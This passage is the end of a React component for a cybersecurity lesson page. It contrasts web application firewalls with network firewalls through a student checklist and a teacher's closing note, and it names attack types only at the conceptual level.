              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>Network Firewalls inspect Layers 3/4 (IP/Ports); WAFs inspect Layer 7 (HTTP/HTTPS payloads).</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>Network Firewalls cannot detect SQLi or XSS because web attacks travel over permitted port 443.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>WAF intercepts OWASP Top 10: SQLi, XSS, RCE, SSRF, Broken Auth, Bad Bots, File Inclusion.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>OWASP Core Rule Set (CRS) uses Collaborative Anomaly Scoring to minimize false positive blocks.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>Libinjection parses SQL and XSS grammar using lexical tokenizers rather than simple regex.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-slate-900 rounded border border-slate-800">
                <span className="text-emerald-400">✔</span>
                <span>Both Network Firewalls and WAFs are required together to achieve complete Defense-in-Depth.</span>
              </div>
            </div>
          </div>
        </section>

        {/* 30 COMPREHENSIVE PRACTICE QUESTIONS & ANSWERS */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <FAQTemplate
            title="Web Application Firewalls (WAF) vs Network Firewalls FAQs"
            subtitle="30 In-depth Practice Questions & WAF Architecture Deep Dives"
            questions={questions}
          />
        </section>

        {/* PRINTABLE STUDY GUIDE NOTE */}
        <section className="space-y-4 animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <PlainTextPrint
            content={noteText}
            title="Web Application Firewalls (WAF) vs Network Firewalls (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic10_note.txt"
          />
        </section>

        {/* TEACHER SUKANTA HUI PROFILE FOOTER */}
        <footer className="pt-4">
          <Teacher
            note="Teacher's Note: Welcome to Topic 10 of Module 005_001! In this lesson, we demystified the fundamental difference between Layer 3/4 Network Firewalls and Layer 7 Web Application Firewalls (WAF). Always remember: a Network Firewall only checks the envelope (IP addresses and port numbers); it is completely blind to what is written inside the letter! An attacker transmitting an SQL Injection, XSS payload, or Log4Shell exploit uses valid TCP port 443, easily passing through a network firewall. Only a WAF terminates HTTPS to deeply parse HTTP headers, query strings, and JSON bodies. In enterprise architectures, both technologies work together in Defense-in-Depth: the Network Firewall defends infrastructure from DDoS and port scans, while the WAF protects application code from OWASP Top 10 exploits. In Topic 11, our final topic of this module, we will explore Firewall Configuration, Testing, and Logging Best Practices!"
          />
        </footer>

      </div>
    </div>
  );
};

export default Topic10;
